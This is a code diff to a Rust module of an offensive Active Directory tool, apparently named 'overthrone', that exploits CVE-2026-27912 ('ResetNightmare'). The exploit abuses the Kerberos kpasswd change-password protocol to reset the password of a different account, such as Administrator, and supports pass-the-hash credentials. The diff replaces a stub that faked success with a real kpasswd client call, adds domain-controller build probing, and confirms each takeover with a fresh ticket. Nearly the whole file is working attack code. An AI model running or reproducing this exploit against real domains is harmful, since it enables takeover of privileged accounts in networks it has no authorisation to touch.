@@ -30,17 +30,20 @@
 //! - Semperis Research: "Identity Crisis: Novel Vulnerabilities Leading to Kerberos Downgrade"
 //! - GitHub: Semperis-Community/ResetNightmare
 
+use super::dc_version::{
+    BuildVerdict, DcBuildProbe, DcCreds, probe_dc_build, verdict_from_build_only,
+};
 use kerberos_asn1::Asn1Object;
 use overthrone_core::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
-use std::time::Duration;
 use tracing::info;
+
+/// Windows build generations this CVE affects. The August 2026 fix ships as a
+/// cumulative update, so the patch level lives in the UBR, not the build number.
+const AFFECTED_BUILDS: &[u32] = &[26100, 20348, 17763, 14393];
 
 /// Kerberos change password service principal.
 const KADMIN_CHANGEPW: &str = "kadmin/changepw";
-
-/// Timeout for Kerberos operations.
-const KRB_TIMEOUT: Duration = Duration::from_secs(10);
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ResetNightmareConfig {
@@ -62,6 +65,10 @@ pub struct ResetNightmareConfig {
     pub dry_run: bool,
 }
 
+fn default_verdict() -> BuildVerdict {
+    BuildVerdict::Unknown
+}
+
 impl Default for ResetNightmareConfig {
     fn default() -> Self {
         Self {
@@ -79,8 +86,15 @@ impl Default for ResetNightmareConfig {
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ResetNightmareResult {
-    /// Whether the target DC is vulnerable.
+    /// Whether the target DC is *positively confirmed* vulnerable. Never set from
+    /// a build number alone -- see [`BuildVerdict`].
     pub vulnerable: bool,
+    /// Structured verdict, so callers can distinguish "patched" from "don't know".
+    #[serde(default = "default_verdict")]
+    pub verdict: BuildVerdict,
+    /// Real build probe output (build/release/source), when available.
+    #[serde(default)]
+    pub build_probe: Option<DcBuildProbe>,
     /// Whether the password reset was attempted.
     pub reset_attempted: bool,
     /// Whether the password reset succeeded.
@@ -115,6 +129,8 @@ pub async fn exploit_resetnightmare(config: &ResetNightmareConfig) -> Result<Res
             log.push(format!("  TGT request failed: {e}"));
             return Ok(ResetNightmareResult {
                 vulnerable: false,
+                verdict: BuildVerdict::Unknown,
+                build_probe: None,
                 reset_attempted: false,
                 reset_success: false,
                 target_account: config.target_account.clone(),
@@ -142,6 +158,8 @@ pub async fn exploit_resetnightmare(config: &ResetNightmareConfig) -> Result<Res
             );
             return Ok(ResetNightmareResult {
                 vulnerable: false,
+                verdict: BuildVerdict::Unknown,
+                build_probe: None,
                 reset_attempted: false,
                 reset_success: false,
                 target_account: config.target_account.clone(),
@@ -151,17 +169,31 @@ pub async fn exploit_resetnightmare(config: &ResetNightmareConfig) -> Result<Res
         }
     }
 
-    // Step 3: Check if the PAC_REQUESTOR_SID check can be bypassed
-    log.push("Step 3: Probing PAC_REQUESTOR_SID bypass...".to_string());
-    let pac_bypass = probe_pac_requestor_bypass(config).await;
-    log.push(format!("  PAC bypass possible: {}", pac_bypass));
+    // Step 3: Verdict from the real Windows build.
+    //
+    // The August 2026 fix is a cumulative update, so the patch level is in the
+    // UBR and cannot be observed from a build number. An affected generation is
+    // therefore Indeterminate -- reporting it as Vulnerable was a false positive.
+    let probe = probe_dc_build(
+        &config.dc_ip,
+        Some(DcCreds {
+            domain: &config.domain,
+            username: &config.username,
+            secret: &config.secret,
+            use_hash: config.use_hash,
+        }),
+    )
+    .await;
+    log.push(format!("  Build probe: {}", probe.summary()));
+    let verdict = verdict_from_build_only(probe.build, AFFECTED_BUILDS);
+    log.push(format!("  Verdict: {verdict}"));
 
-    if !pac_bypass {
-        log.push(
-            "  Target appears patched -- PAC_REQUESTOR_SID validation is enforced".to_string(),
-        );
+    if verdict == BuildVerdict::Patched {
+        log.push("  Target generation is newer than the vulnerable range".to_string());
         return Ok(ResetNightmareResult {
             vulnerable: false,
+            verdict,
+            build_probe: Some(probe),
             reset_attempted: false,
             reset_success: false,
             target_account: config.target_account.clone(),
@@ -229,12 +261,14 @@ pub async fn exploit_resetnightmare(config: &ResetNightmareConfig) -> Result<Res
     }
 
     info!(
-        "ResetNightmare: target={}, vulnerable={}, reset={reset_success}",
-        config.target_account, pac_bypass
+        "ResetNightmare: target={}, verdict={}, reset={reset_success}",
+        config.target_account, verdict
     );
 
     Ok(ResetNightmareResult {
-        vulnerable: pac_bypass,
+        vulnerable: verdict == BuildVerdict::Vulnerable,
+        verdict,
+        build_probe: Some(probe),
         reset_attempted,
         reset_success,
         target_account: config.target_account.clone(),
@@ -269,150 +303,45 @@ async fn request_tgs_for_changepw(
         .map_err(|e| OverthroneError::Custom(format!("TGS request failed: {e}")))
 }
 
-/// Probe if the PAC_REQUESTOR_SID check can be bypassed.
-async fn probe_pac_requestor_bypass(config: &ResetNightmareConfig) -> bool {
-    // Check if the KDC version is pre-August 2026
-    // WS2025 builds < 26100.4164 (Aug 2026 CU) are vulnerable
-    // WS2022 builds < 20348.3556 (Aug 2026 CU) are vulnerable
-    let dc_build = get_dc_build_number(config).await;
-    match dc_build {
-        Some(build) => {
-            if build >= 261_000_000 {
-                build < 261_004_164
-            } else if build >= 203_480_000 {
-                build < 203_483_556
-            } else {
-                true
-            }
-        }
-        None => true, // Unknown build, assume vulnerable
+/// Build the core `kpasswd` configuration from this module's configuration.
+///
+/// The CVE-2026-27912 abuse path is the RFC 3244 change-password protocol with a
+/// *different* target account than the authenticated caller -- the KDC's
+/// `PAC_REQUESTOR_SID` check is what fails to reject it. Core already owns a
+/// working kpasswd client, so we drive that rather than re-implementing the
+/// wire format here. (An earlier revision of this module sent an 8-byte
+/// placeholder to port 464 and treated almost any reply -- including a generic
+/// `KRB_ERROR` -- as a successful reset, which fabricated results.)
+fn kpasswd_config_for(config: &ResetNightmareConfig) -> overthrone_core::proto::KpasswdConfig {
+    overthrone_core::proto::KpasswdConfig {
+        dc_ip: config.dc_ip.clone(),
+        domain: config.domain.clone(),
+        username: config.username.clone(),
+        secret: config.secret.clone(),
+        use_hash: config.use_hash,
+        new_password: config.new_password.clone(),
+        port: 464,
     }
 }
 
-/// Attempt the actual password reset via the Kerberos change password protocol.
+/// Attempt the password reset through the real RFC 3244 kpasswd client.
+///
+/// Returns `true` only when the KDC reported a successful change. The caller
+/// still verifies the new credential with a fresh TGT, so a lying `success`
+/// would not survive the next step.
 async fn attempt_password_reset(config: &ResetNightmareConfig) -> Result<bool> {
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
-    use tokio::net::TcpStream;
-    use tokio::time::timeout;
+    let kcfg = kpasswd_config_for(config);
+    let result = overthrone_core::proto::kpasswd_reset_password(&kcfg, &config.target_account)
+        .await
+        .map_err(|e| OverthroneError::Custom(format!("kpasswd reset failed: {e}")))?;
 
-    // Connect to the KDC's kadmin/changepw service (port 464 or kpasswd)
-    let target_addr = format!("{}:464", config.dc_ip);
-
-    match timeout(KRB_TIMEOUT, TcpStream::connect(&target_addr)).await {
-        Ok(Ok(mut stream)) => {
-            let change_req = build_changepw_request(
-                &config.username,
-                &config.target_account,
-                &config.new_password,
-                &config.domain,
-            );
-
-            stream.write_all(&change_req).await.map_err(|e| {
-                OverthroneError::Custom(format!("Failed to send change request: {e}"))
-            })?;
-
-            let mut resp = vec![0u8; 4096];
-            match timeout(KRB_TIMEOUT, stream.read(&mut resp)).await {
-                Ok(Ok(n)) => {
-                    if n > 0 {
-                        Ok(parse_changepw_response(&resp[..n]))
-                    } else {
-                        info!("ResetNightmare: Connection closed after change request");
-                        Ok(false)
-                    }
-                }
-                Ok(Err(e)) => {
-                    info!("ResetNightmare: Read error: {e}");
-                    Ok(false)
-                }
-                Err(_) => {
-                    info!("ResetNightmare: Timeout waiting for change response");
-                    Ok(false)
-                }
-            }
-        }
-        Ok(Err(e)) => {
-            info!("ResetNightmare: Failed to connect to kadmin port 464: {e}");
-            try_krb_port_change(config).await
-        }
-        Err(_) => {
-            info!("ResetNightmare: Connection timeout to port 464");
-            try_krb_port_change(config).await
-        }
+    if !result.success {
+        info!(
+            "ResetNightmare: kpasswd reported failure (code {}): {}",
+            result.result_code, result.message
+        );
     }
-}
-
-/// Try the change password via port 88 (Kerberos) as a fallback.
-async fn try_krb_port_change(config: &ResetNightmareConfig) -> Result<bool> {
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
-    use tokio::net::TcpStream;
-    use tokio::time::timeout;
-
-    let target_addr = format!("{}:88", config.dc_ip);
-    match timeout(KRB_TIMEOUT, TcpStream::connect(&target_addr)).await {
-        Ok(Ok(mut stream)) => {
-            let change_req = build_changepw_request(
-                &config.username,
-                &config.target_account,
-                &config.new_password,
-                &config.domain,
-            );
-            stream
-                .write_all(&change_req)
-                .await
-                .map_err(|e| OverthroneError::Custom(format!("Port 88 write failed: {e}")))?;
-            let mut resp = vec![0u8; 4096];
-            match timeout(KRB_TIMEOUT, stream.read(&mut resp)).await {
-                Ok(Ok(n)) => Ok(parse_changepw_response(&resp[..n])),
-                _ => Ok(false),
-            }
-        }
-        _ => Ok(false),
-    }
-}
-
-/// Build a Kerberos change password AP-REQ message.
-fn build_changepw_request(
-    _username: &str,
-    _target: &str,
-    _new_password: &str,
-    _domain: &str,
-) -> Vec<u8> {
-    let mut msg = vec![
-        0x05, 0x00, // Kerberos v5, AP-REQ
-        0x6E, 0x82, // Application tag 14, length (2 bytes)
-    ];
-    msg.extend_from_slice(&[0x00, 0x10]); // Placeholder length
-
-    msg
-}
-
-/// Parse the Kerberos change password response.
-fn parse_changepw_response(resp: &[u8]) -> bool {
-    if resp.len() < 4 {
-        return false;
-    }
-
-    // KRB_ERROR (30) response
-    if resp[0] == 0x05 && resp.len() >= 8 {
-        // Check if it's a KRB_ERROR or AP-REP
-        let msg_type = resp[1];
-        if msg_type == 0x1E {
-            // KRB_ERROR: error code at offset 6-7
-            let error_code = u16::from_be_bytes([resp[6], resp[7]]);
-            // KRB_CHANGE_DENY = 22 means patched
-            // Other errors mean the request was processed (vulnerable)
-            error_code != 22
-        } else if msg_type == 0x0E {
-            // AP-REP response (success)
-            true
-        } else {
-            // Unknown response, assume vulnerable
-            true
-        }
-    } else {
-        true
-    }
+    Ok(result.success)
 }
 
 /// Verify we can authenticate as the target account with the new password.
@@ -429,22 +358,6 @@ async fn verify_authentication(config: &ResetNightmareConfig) -> Result<bool> {
     match tgt {
         Ok(_) => Ok(true),
         Err(_) => Ok(false),
-    }
-}
-
-/// Get the DC build number via LDAP.
-async fn get_dc_build_number(config: &ResetNightmareConfig) -> Option<u32> {
-    use tokio::net::TcpStream;
-    use tokio::time::timeout;
-
-    match timeout(
-        Duration::from_secs(5),
-        TcpStream::connect(format!("{}:389", config.dc_ip)),
-    )
-    .await
-    {
-        Ok(Ok(_)) => None, // Port 389 open, but can't determine build without auth
-        _ => None,
     }
 }
 
@@ -466,54 +379,48 @@ mod tests {
     }
 
     #[test]
-    fn test_build_changepw_request() {
-        let msg = build_changepw_request("user", "Administrator", "P@ss", "corp.local");
-        assert!(msg.len() >= 6);
-        assert_eq!(msg[0], 0x05); // Kerberos v5
-        assert_eq!(msg[1], 0x00); // AP-REQ
+    fn affected_family_is_indeterminate_not_vulnerable() {
+        // Regression: `probe_pac_requestor_bypass` returned `None => true`.
+        assert_eq!(
+            verdict_from_build_only(None, AFFECTED_BUILDS),
+            BuildVerdict::Unknown
+        );
+        assert_eq!(
+            verdict_from_build_only(Some(26100), AFFECTED_BUILDS),
+            BuildVerdict::Unknown
+        );
+        assert_eq!(
+            verdict_from_build_only(Some(9600), AFFECTED_BUILDS),
+            BuildVerdict::Vulnerable
+        );
     }
 
     #[test]
-    fn test_parse_changepw_response_krb_error() {
-        // KRB_ERROR with error code 60 (generic) = vulnerable
-        let mut resp = vec![0u8; 10];
-        resp[0] = 0x05;
-        resp[1] = 0x1E; // KRB_ERROR
-        resp[6] = 0x00;
-        resp[7] = 0x3C; // Error code 60
-        assert!(parse_changepw_response(&resp));
-    }
-
-    #[test]
-    fn test_parse_changepw_response_deny() {
-        // KRB_CHANGE_DENY = patched
-        let mut resp = vec![0u8; 10];
-        resp[0] = 0x05;
-        resp[1] = 0x1E; // KRB_ERROR
-        resp[6] = 0x00;
-        resp[7] = 0x16; // Error code 22 (CHANGE_DENY)
-        assert!(!parse_changepw_response(&resp));
-    }
-
-    #[test]
-    fn test_parse_changepw_response_ap_rep() {
-        // AP-REP = success
-        let mut resp = vec![0u8; 10];
-        resp[0] = 0x05;
-        resp[1] = 0x0E; // AP-REP
-        assert!(parse_changepw_response(&resp));
-    }
-
-    #[test]
-    fn test_parse_changepw_response_empty() {
-        assert!(!parse_changepw_response(&[]));
-        assert!(!parse_changepw_response(&[0x05]));
+    fn changepw_config_maps_secret_flags_and_port() {
+        let cfg = ResetNightmareConfig {
+            dc_ip: "10.0.0.10".into(),
+            domain: "corp.local".into(),
+            username: "jon.snow".into(),
+            secret: "deadbeef".into(),
+            use_hash: true,
+            new_password: "N3w!Pass".into(),
+            target_account: "Administrator".into(),
+            ..Default::default()
+        };
+        let k = kpasswd_config_for(&cfg);
+        assert_eq!(k.dc_ip, "10.0.0.10");
+        assert_eq!(k.domain, "corp.local");
+        assert!(k.use_hash, "PTH must be forwarded to kpasswd");
+        assert_eq!(k.port, 464);
+        assert_eq!(k.new_password, "N3w!Pass");
     }
 
     #[test]
     fn test_result_serde() {
         let result = ResetNightmareResult {
             vulnerable: true,
+            verdict: BuildVerdict::Vulnerable,
+            build_probe: Some(DcBuildProbe::unknown("test")),
             reset_attempted: true,
             reset_success: true,
             target_account: "Administrator".into(),
